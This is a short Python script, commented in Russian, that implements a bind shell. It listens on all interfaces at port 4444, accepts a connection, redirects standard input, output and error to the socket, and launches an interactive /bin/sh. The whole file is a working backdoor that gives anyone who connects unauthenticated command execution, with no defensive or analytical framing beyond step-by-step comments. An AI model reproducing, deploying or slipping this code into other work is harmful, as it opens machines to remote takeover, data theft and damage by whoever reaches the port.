import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Создание сокет
s.bind(("0.0.0.0", 4444))  # Привязываем сокет к адресу и порту
s.listen(1)  # Прослушивание входящих соединений
c, addr = s.accept()  # Принять входящее соединение

   # Перенаправление стандартных потоков ввода/вывода
os.dup2(c.fileno(), 0)  # Стандартный ввод
os.dup2(c.fileno(), 1)  # Стандартный вывод
os.dup2(c.fileno(), 2)  # Стандартный поток ошибок

   # Запуск оболочки
p = subprocess.call(["/bin/sh", "-i"])
